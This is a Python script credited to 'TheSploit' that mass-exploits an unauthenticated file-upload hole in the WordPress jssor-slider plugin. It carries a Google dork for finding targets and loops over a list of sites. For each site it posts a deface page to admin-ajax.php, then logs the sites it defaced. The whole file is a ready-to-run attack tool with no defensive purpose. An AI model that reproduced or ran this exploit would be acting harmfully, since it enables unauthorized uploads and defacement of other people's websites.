
import requests
from colorama import Fore, Style, Back, init
import sys
import os
is_windows = hasattr(sys, 'getwindowsversion')
requests.packages.urllib3.disable_warnings()
init()

if is_windows:
	os.system("cls")
else:
	os.system("clear")

banner = """
{}
######## ##     ## ########  ######  ########  ##     
   ##    ##     ## ##       ##    ## ##     ## ##       
   ##    ##     ## ##       ##       ##     ## ##       
   ##    ######### ######    ######  ########  ##       
   ##    ##     ## ##             ## ##        ##       
   ##    ##     ## ##       ##    ## ##        ##       
   ##    ##     ## ########  ######  ##        ######## 
* Dork: inurl:/wp-content/jssor-slider/
* Author: TheSploit
{}* ==> 
""".format(Fore.BLUE, Fore.CYAN)

print Style.BRIGHT
print banner

exploit = "/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library"
defacesdirectory = "/wp-content/jssor-slider/jssor-uploads/"

vulnsf = open('defaceds.txt', 'a')

sites_vuln = []

if len(sys.argv) > 2:
	filename = sys.argv[1]
	deface = sys.argv[2]
	filen = open(filename, 'r')
	file = filen.readlines()
	for site in file:
		files = {'file': open(deface, 'rb')}
		r = requests.post(site + exploit, files=files, verify=False)
		resposta = r.text
		if "\"result\"" in resposta:
			print Fore.GREEN + "[!] WEBSITE VULN COK: {}".format(site)
			print Fore.BLUE + "[!] SUKSES NGEDEPES COK: {}/{}/{}".format(site, defacesdirectory, deface)
			sites_vuln.append("\n{}/{}/{}".format(site, defacesdirectory, deface))
	 	else:
	 		print Fore.GREEN + "[!] WEBSITE NGGA VULN COK: {}".format(site)

	vulnsf.writelines(sites_vuln)
	vulnsf.close()
	filen.close()

else:
	print Fore.PURPLE+"[!] PENGGUNAAN: script.py <list> <deface.htm>"
